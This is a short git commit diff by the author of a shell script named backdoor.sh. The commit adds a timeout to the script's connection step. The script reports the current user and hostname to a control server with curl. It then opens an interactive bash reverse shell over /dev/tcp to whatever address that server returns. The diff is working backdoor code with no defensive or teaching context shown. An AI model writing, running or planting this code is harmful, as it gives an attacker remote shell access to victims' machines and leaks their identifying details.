77bea76914c132a1173cb60b3d11d9cb57ba8eb1
David Mateos <davidete345@gmail.com>
2020-01-25 17:16:11 +0100

    Added timeout to connection of backdoor script

--- backdoor.sh
+++ backdoor.sh
@@ -2,7 +2,7 @@
 ip_server="192.168.1.40"
 user=`whoami`
 hostname=`hostname`
-response=`curl -s ${ip_server}:12345/update -d "username=${user}&host=${hostname}"` || { echo "ERROR CURL"; exit 1; }
+response=`curl -m 5 -s ${ip_server}:12345/update -d "username=${user}&host=${hostname}"` || { echo "ERROR CURL"; exit 1; }
 if [ ! "$response" = "0" ]; then
 	echo "Connecting to $response"
 	bash -i >& /dev/tcp/${response}/9834 0>&1 #reverse shell
